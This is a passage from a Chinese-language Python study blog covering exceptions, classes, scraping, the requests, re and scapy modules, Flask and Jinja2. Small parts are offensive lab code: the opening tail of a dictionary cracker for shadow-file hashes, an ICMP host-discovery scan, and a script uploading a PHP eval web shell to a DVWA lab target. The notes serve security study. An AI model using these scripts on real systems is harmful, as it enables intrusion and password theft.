class="keyword">for</span> password <span class="keyword">in</span> f:</span><br><span class="line">        password = password.strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Trying password: <span class="subst">&#123;password&#125;</span>\t\t\t&quot;</span>, end=<span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接验证：passlib 会自动从 shadow_cipher 中提取 salt 和 rounds</span></span><br><span class="line">        <span class="keyword">if</span> sha51tp.verify(password, shadow_cipher):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[+] PASSWORD FOUND: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[-] Password not found in dictionary.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+## 错误和异常
+
+### 基本概念
+
+#### python异常
+
+当程序运行时,因为遇到未知的错误而导致中止运行,便会出现Traceback 消息,打印异常。异常即是一个事件,该事件会在程序执行过程中发生,影响程序的正常执行。一般情况下,在Python 无法正常处理程序时就会发生一个异常。异常是Python对象,表示一个错误。当Python脚本发生异常时我们需要响应处理它,否则程序会终止执行。
+
+| 异常              | 描述                                                         |
+| ----------------- | ------------------------------------------------------------ |
+| SyntaxError       | 语法错误                                                     |
+| NameError         | 未声明/初始化对象                                            |
+| IndexError        | 序列中没有此索引                                             |
+| KeyboardInterrupt | 用户中断执行（Ctrl + C）                                     |
+| EOFError          | 没有内建输入，到达EOF标记（Ctrl + D）</br>   不适用Windows系统 |
+| IOError           | 输入/输出操作失败                                            |
+| ValueError        | 当操作或函数接收到具有正确类型但值不适合的参数，并且情况不能用更精确的异常来描述时将被引发 |
+| TypeError         | 字符串与整数相加时触发                                       |
+
+### 捕获异常
+
+如果一个语句发生了错误或异常，跳过该语句执行，执行另外的语句  
+
+#### try except语句
+
+尝试执行try语句，如果遇到异常则执行except语句
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">pass</span> <span class="comment"># 监控这里的异常</span></span><br><span class="line"><span class="keyword">except</span> [exception reason]:</span><br><span class="line">	<span class="keyword">pass</span> <span class="comment"># 异常处理代码</span></span><br></pre></td></tr></table></figure>
+
+#### 捕获多种异常
+
+#### 捕获所有异常
+
+如果出现的异常没有出现在指定要捕获的异常列表中,程序仍然会中断。可以使用在异常继承的树结构中,BaseException 是在最顶层的,所以使用它可以捕获任意类型的异常。
+
+python异常树：
+
+![image-20251221235446480](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251221235446480.png)
+
+![image-20251221235504729](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251221235504729.png)
+
+### 处理异常
+
+else 子句:在try 范围中没有异常被检测到时,执行else 子句。在else 范围中的任何代码运行前,try 范围中的所有代码必须完全成功。
+
+finally 子句:finally 子句是无论异常是否发生,是否捕捉都会执行的一段代码。如果在获取数据过程中,发生了异常,就会导致整个脚本结束执行,文件也无法关闭了。为了解决这个问题,可以采用异常处理中的finally 子句,也就是说，无论语句是否正常执行，都需要关闭
+
+### 特殊场景
+
+#### with语句
+
+基本语法
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> expression [<span class="keyword">as</span> variable]:</span><br><span class="line">   <span class="comment"># 代码块</span></span><br></pre></td></tr></table></figure>
+
+expression返回一个支持上下文管理协议的对象
+
+as variable 是可选的，用于将表达式结果赋值给变量
+
+代码块执行完毕后，自动调用清理方法
+
+## 7.面向对象编程
+
+### 7.1类
+
+类是一类事物的统称,对象就是类的实例化。
+
+类有属性,变量,
+
+类有方法,函数
+
+#### 7.1.1创建类
+
+Python 使用 class关键字来创建类,通常类名的第一个字母大写,使用驼峰式命名法,单词首字母均大写。类有属性和方法组成。
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassName</span> (<span class="title class_ inherited__">bases</span>) :</span><br><span class="line">	<span class="string">&#x27;class documentation string&#x27;</span></span><br><span class="line">	class_suite</span><br></pre></td></tr></table></figure>
+
+#### 7.1.2init方法
+
+是类的实例,对象创建后第一个被调用的方法,即使没有被显示调用。通常被用来进行对象中属性的初始化。设置实例的属性可以在实例创建后任意时间进行,但是通常情况下优先在\__init__()方法中实现
+
+定义类型
+
+实例化对象（创建第一个对象）
+
+初始化对象（第一次个对象属性赋值）
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stu</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_init_</span>(<span class="params">self, name = <span class="string">&quot;name&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">20</span>, score = <span class="number">0.0</span></span>):</span><br><span class="line">	<span class="variable language_">self</span>.name = name</span><br><span class="line">	<span class="variable language_">self</span>.sex = sex</span><br><span class="line">	<span class="variable language_">self</span>.age =age</span><br><span class="line">	<span class="variable language_">self</span>.score = score</span><br><span class="line"></span><br><span class="line">stu1 = Stu(name = <span class="string">&quot;AJEST&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">99.9</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;stu1.name&#125;</span>&#x27;s score is <span class="subst">&#123;stu1.score&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+### 7.2方法
+
+#### 7.2.1绑定方法
+
+方法仅仅是类内部定义的函数,方法只有在其所属的类拥有实例时,才能被调用;任何一个方法定义中的第一个参数都是变量self,它表示调用此方法的实例对象就是自己。
+
+类中的方法,也就是类中定义的函数,这个函数第一个参数永远是self,表示自己。
+
+![image-20251224000339123](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251224000339123.png)
+
+### 7.3继承
+
+#### 7.3.1子类继承
+
+继承描述了基类(祖先)的属性如何遗传给派生类(子孙),子类可以继承它的基类的任何属性,不管是数据属性还是方法。
+
+![image-20251224000608438](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251224000608438.png)
+
+#### 方法重写
+
+如果子类中有和父类同名的方法，父类方法将被覆盖；如果要访问父类的方法，则要调用一个未绑定的父类方法，明确给出子类的实例
+
+![image-20251224000838024](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251224000838024.png)
+
+![image-20251224000904379](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251224000904379.png)
+
+#### 多重继承
+
+Python 允许多重继承,即一个类可以是多个父类的子类,子类可以拥有所有父类的属性。
+
+![image-20251224000929226](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251224000929226.png)
+
+### 7.4多态
+
+多态使一个方法在不同的类中最终呈现不同的效果
+
+### 魔法函数
+
+#### 类和实例的内建函数
+
+| 函数         | 作用                                 |
+| ------------ | ------------------------------------ |
+| issubclass() | 判断一个类是另一个类的子类或子孙类   |
+| isinstance() | 判定一个对象是否是另一个给定类的实例 |
+| hasattr()    | 判断一个对象是否有一个特定的属性     |
+| getattr()    | 获得一个对象的属性值                 |
+| setattr()    | 设置一个对象的属性                   |
+| delattr()    | 删除一个对象的属性                   |
+
+#### 常用的魔法函数
+
+魔法函数是系统自带的，会在恰当的时候自动调用
+
+![image-20251224001434388](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251224001434388.png)
+
+### 7.5私有化
+
+Python 为类元素(属性和方法)的私有性提供初步的形式,由双下划线开始的属性在运行时是不允许的。
+
+![image-20251224001532654](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251224001532654.png)
+
+### 7.6python内置类
+
+所有的子类都有一个共同的父类object，如果没指定继承，默认父类是object
+
+## 网页信息爬取
+
+思路：
+
+获取整个页面所有源代码
+
+筛选出源码中图片地址
+
+将图片下载到本地
+
+### 获取网页HTML源代码
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_html</span>(<span class="params">url</span>):</span><br><span class="line">	res = requests.get (url = url)</span><br><span class="line">	<span class="keyword">return</span> res.content</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_html(url))</span><br></pre></td></tr></table></figure>
+
+### 提取图片地址
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_html</span>(<span class="params">url</span>):</span><br><span class="line">	res = requests.get (url = url)</span><br><span class="line">	<span class="keyword">return</span> res. text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_img_path_list</span>(<span class="params">html</span>):</span><br><span class="line">	img_path_list = re.findall(<span class="string">r&quot;style/\w*.jpg&quot;</span>, html)</span><br><span class="line">	<span class="keyword">return</span> img_path_list</span><br><span class="line"></span><br><span class="line">html = get_html(url)</span><br><span class="line">img_path_list = get_img_path_list(html)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(img_path_list)</span><br></pre></td></tr></table></figure>
+
+### 下载图片
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://10.4.7.193/spider/index.html&quot;</span></span><br><span class="line"></span><br><span class="line">img_path = <span class="string">&quot;style/u24020836931378817798fm170s6BA8218A7B2128178FA0A49F010080E2w.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_img</span>(<span class="params">img_path</span>):</span><br><span class="line">	img_url=url[<span class="number">0</span>:url.rfind(<span class="string">&quot;/&quot;</span>) +<span class="number">1</span>]+ img_path</span><br><span class="line">	res = requests.get(url = img_url)</span><br><span class="line">	img_save_path =<span class="string">&quot;./images/1.jpg&quot;</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(img_save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(res.content)</span><br><span class="line"></span><br><span class="line">download_img (img_path)</span><br></pre></td></tr></table></figure>
+
+## 9.python模块
+
+模块是一组python代码的集合
+
+引入模块
+
+import module
+
+### pickle模块
+
+用来实现序列化
+
+pickle.dumps()方法把任意对象序列化成一个bytes,pickle.loads()方法可以反序列化出对象
+
+### JSON模块
+
+处理JSON数据
+
+dumps()方法可以返回一个str,内容就是标准的JSON
+
+loads()方法可以把JSON反序列化为Python对象
+
+python的dict对象可以直接序列化为JSON的{}
+
+### scapy模块
+
+#### 内网主机存活检测程序
+
+构造数据包
+
+![image-20251223234047267](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251223234047267.png)
+
+![image-20251223234106293](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251223234106293.png)
+
+发送数据包
+
+| 发送数据包的函数 | 说明                          |
+| ---------------- | ----------------------------- |
+| sr(pkt)          | 发送数据包,接收所有返回包。   |
+| sr1(pkt)         | 发送数据包,接收一个返回包。   |
+| send(pkt)        | 发送数据包,不等待返回包。     |
+| srp(pkt)         | 发送2 层数据包,等待回应。     |
+| sendp(pkt)       | 发送2 层数据包,不等待返回包。 |
+
+查看返回包
+
+![image-20251223234841708](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251223234841708.png)
+
+主机存活检测程序：
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&quot;scapy.runtime&quot;</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">src_ip = <span class="string">&quot;192.168.243.129&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">	dst_ip = <span class="string">f&quot;192.168.243.<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;\r[-] Trying target <span class="subst">&#123;dst_ip&#125;</span>&quot;</span>, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">	pkt = IP(src = src_ip, dst = dst_ip)/ICMP()</span><br><span class="line">	res = sr1(pkt, timeout = <span class="number">0.2</span>, verbose = <span class="literal">False</span>)</span><br><span class="line">	<span class="keyword">if</span> res <span class="keyword">and</span> res.<span class="built_in">type</span> == <span class="number">0</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;\n[+] <span class="subst">&#123;dst_ip&#125;</span> is alive&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+### requests模块
+
+主要用来模拟浏览器行为，发送HTTP请求，并处理HTTP响应的功能
+
+处理网页内容的基本逻辑：
+
+定义一个URL地址
+
+发送HTTP请求
+
+处理HTTP响应
+
+#### 模块中请求方法
+
+| 请求方法             | 说明                         |
+| -------------------- | ---------------------------- |
+| requests.get ()      | GET方法                      |
+| requests. post ()    |                              |
+| requests. head ()    | 只返回响应头部，没有响应正文 |
+| requests. options () |                              |
+| requests.put ()      |                              |
+| requests.delete()    |                              |
+
+#### 请求方法中的参数
+
+| 参数名字        | 参数含义       |
+| --------------- | -------------- |
+| url             | 请求URL 地址   |
+| headers         | 自定义请求头部 |
+| params          | 发送GET 参数   |
+| data            | 发送POST 参数  |
+| timeout         | 请求延时       |
+| files           | 文件上传数据流 |
+| allow_redirects | 是否允许重定向 |
+
+#### 响应对象中的属性
+
+requests内部定义了一个类：requests.models.Response（通常简称为 Response类）。
+
+当调用请求方法时，函数会创建一个 Response 对象，并把服务器返回的数据（状态码、headers、body 等）填进去，然后返回这个对象。
+
+用 res 接收它， res 就是这个 Response 对象的一个实例
+
+| 方法名                     | 解释               |
+| -------------------------- | ------------------ |
+| response. text             | 响应正文(文本方式) |
+| response. content          | 响应正文(二进制)   |
+| response. status_code      | 响应状态码         |
+| response. url              | 发送请求的URL 地址 |
+| response. headers          | 响应头部           |
+| response. request. headers | 请求头部           |
+| response. cookies          | cookie 相关信息    |
+
+#### 基本用法
+
+有的后端程序会检测 UA，禁止爬虫/空 UA 访问
+
+自定义请求头，模拟正常浏览器，降低被拦截的概率
+
+##### 模拟浏览器
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/php/functions/get.php&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1/php/functions/get.php?username=ajest&amp;password=123456&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">	<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;</span><br><span class="line">	<span class="string">&quot;username&quot;</span>: <span class="string">&quot;AJEST&quot;</span>,</span><br><span class="line">	<span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get (url = url, headers = headers, params = params)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+##### POST传参
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/php/functions/post.php&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">	<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span></span><br><span class="line">]</span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&quot;username&quot;</span>: <span class="string">&quot;AJEST&quot;</span>,</span><br><span class="line">	<span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests. post (url = url, headers = headers, data = data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+##### 文件上传
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://10.4.7.193/dvwa_2.0.1/vulnerabilities/upload/&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span></span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;MAX_FILE_SIZE&quot;</span>:<span class="number">100000</span>,</span><br><span class="line"><span class="string">&quot;Upload&quot;</span>:<span class="string">&quot;Upload&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">files = &#123;</span><br><span class="line"><span class="string">&quot;uploaded&quot;</span>: (<span class="string">&quot;2.php&quot;</span>, <span class="string">b&quot; &lt;? php @eval($_REQUEST[777]); phpinfo()?&gt;&quot;</span>, <span class="string">&quot;image/png&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res =requests.post(url = url, headers = headers, data = data, files = files, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(res.content, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pre = soup.find_all(<span class="string">&#x27;pre&#x27;</span>)</span><br><span class="line">pre = pre[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">path = url + pre.text[<span class="number">0</span>:pre.text. find(<span class="string">&quot; &quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Shell Paht: <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+##### 服务器超时
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/php/functions/sleep.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	res = requests.get(url = url, timeout = <span class="number">30</span>)</span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;timeout!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+### re模块
+
+正则表达式（RE）
+
+从哪一个字符串中搜素什么内容
+
+特征，规则是什么
+
+#### 核心函数
+
+| 核心函数      | 说明                                                         |
+| ------------- | ------------------------------------------------------------ |
+| re.findall()  | 在字符串中查找正则表达式的所有(非覆盖)出现;返回一个匹配对象的列表。 |
+| re.match()    | 尝试用正则表达式模式从字符串的开头匹配;<br/>如果匹配成功,则返回一个匹配对象,否则返回None。 |
+| re.search()   | 在字符串中查找正则表达式模式的第一次出现;<br/>如果匹配成,则返回一个匹配对象,否则返回None。 |
+| re.group()    | 使用match 或者search 匹配成功后,返回的匹配对象;<br/>可以通过group()方法获取得匹配内容。 |
+| re.finditer() | 和findall()函数有相同的功能,但返回的不是列表而是迭代器;<br/>对于每个匹配,该迭代器返回一个匹配对象。 |
+| re.split()    | 根据<br/>根据正则表达式中的分隔符把字符分割为一个列表,并返回成功匹配的列表;<br/>字符串也有类似的方法,但是正则表达式更加灵活。 |
+| re.sub()      | 把字符串中所有匹配正则表达式的地方换成新的字符串             |
+
+re.findall()
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.findall(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+pattern: 正则表达式模式，它指定了你要匹配的文本模式。
+
+string: 目标字符串，在这个字符串中查找符合模式的所有子串。
+
+flags: 可选参数，用于控制匹配方式
+
+### BeautifulSoup(bs4)
+
+### base64
+
+### string
+
+### http.server模块
+
+用于建立简单的服务器
+
+## 10.python框架
+
+### flask
+
+在 Flask 应用程序中，config是一个特殊的对象，用于存储配置变量。这些配置变量通常包括应用的秘密密钥、数据库连接字符串、调试模式设置等。
+
+使用JinJia2进行模板相关的操作
+
+Flask ：flask框架的核心类
+
+作用：创建 Web 应用实例
+
+用法：app = Flask(\__name__)
+
+request：flask提供的请求对象
+
+作用：获取用户发送的 HTTP 请求数据（如 URL 参数、表单、Header 等）
+
+用法：request.args.get('name')
+
+### pty
+
+pty 模块用于在 Unix 系统 上操作伪终端（Pseudo Terminal），进行终端交互和自动化操作
+
+#### 核心函数：
+
+pty.spawn(argv, master_read=None, stdin_read=None)
+
+参数：
+
+argv (必需)：要执行的命令及其参数
+
+## 11.模板语法
+
+### 11.1JinJia2
+
+#### 11.1.1变量表示
+
+{{argv}}
+
+#### 11.1.2for循环
+
+{%for a in b %}
+
+​	dosomething
+
+{% endfor %}
+
+#### 11.1.3if判断
+
+{% if true %}
+
+​	dosomething
+
+{% elif false %}
+
+​	dosomething
+
+{% else %}
+
+​	dosomething
+
+{% endif %}
+
+## 12.内置属性
+
+\__base__只能获取一个直接父类
+
+\__bases__获取所有直接父类
+
+\__class__是类的内置属性，用来获取类的类型，相当于type
+
+\__golbals__所有函数都会有一个\__globals__属性，它返回函数所在模块命名空间中所有变量(返回一个字典)
+
+\__name__用来获取类的名称
+
+\__subclasses__查看类的直接子类
+
+\__mro__查看类的继承顺序
+
+
+
+
+
+  </div>
+</article>
+
+  </main>
+
+  <button class="back-to-top" id="backToTop" type="button" aria-label="回到顶部"><i data-lucide="arrow-up"></i></button>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  <script src="/js/main.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
+
+
